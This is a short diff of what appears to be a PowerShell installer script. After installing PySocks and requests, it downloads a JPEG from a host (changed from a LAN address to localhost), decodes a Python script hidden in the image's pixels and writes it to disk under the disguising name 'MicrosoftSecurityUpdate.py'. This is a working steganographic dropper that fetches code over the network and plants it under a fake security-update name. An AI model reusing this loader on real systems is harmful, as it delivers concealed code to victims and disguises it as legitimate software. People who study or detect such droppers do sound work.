@@ -22,7 +22,7 @@ pip install --no-input PySocks
 pip install --no-input requests
 
 # Download the image, extract the python script from it and save it on disk. 
-Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load("http://192.168.10.128/pa_files/7.jpg");
+Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load("http://127.0.0.1/7.jpg");
 $gg=$dd.Image;$oo=abc Byte[] 7680;(0..1)|%{foreach($x in(0..3839)){$p=$gg.GetPixel($x,$_);$oo[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};
 $egh=[System.Text.Encoding]::UTF8.GetString($oo[0..5784]);Out-File -FilePath "$InstallDir\MicrosoftSecurityUpdate.py" -InputObject $egh -Force -Encoding utf8
 
